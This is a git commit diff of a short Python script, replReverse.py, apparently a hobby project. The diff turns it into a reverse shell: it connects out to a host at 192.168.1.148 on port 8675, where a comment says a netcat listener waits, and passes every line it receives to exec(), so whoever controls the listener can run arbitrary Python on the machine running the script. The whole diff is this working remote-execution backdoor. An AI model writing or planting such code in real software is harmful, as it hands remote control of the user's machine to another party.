fea112b1762027650edaa276ddd7d9e608029b9a
tungul <lugnut1206@gmail.com>
2013-09-21 20:42:28 -0700

    repl completed, testing for win

--- replReverse.py
+++ replReverse.py
@@ -1,7 +1,15 @@
 import socket
 
-client = socket.create_connection(("localhost", 8675))
+client = socket.create_connection(("192.168.1.148", 8675)) # to connect back to home to $nc -l -p 8675
 
-while True:
-	line = client.recv(1024)
-	print line.replace("\n", "")
+def reply(str):
+	client.send(str + "\n")
+
+while True: # <-----------------------+
+	line = client.recv(1024) #read    |
+	cmd = line.replace("\n", "") #    |
+	print "==>", cmd #eval/exec       |
+	exec(cmd) #                       |
+	# print result #print               | # apparently no print
+	# reply(result) #                   |
+	# loop ---------------------------+
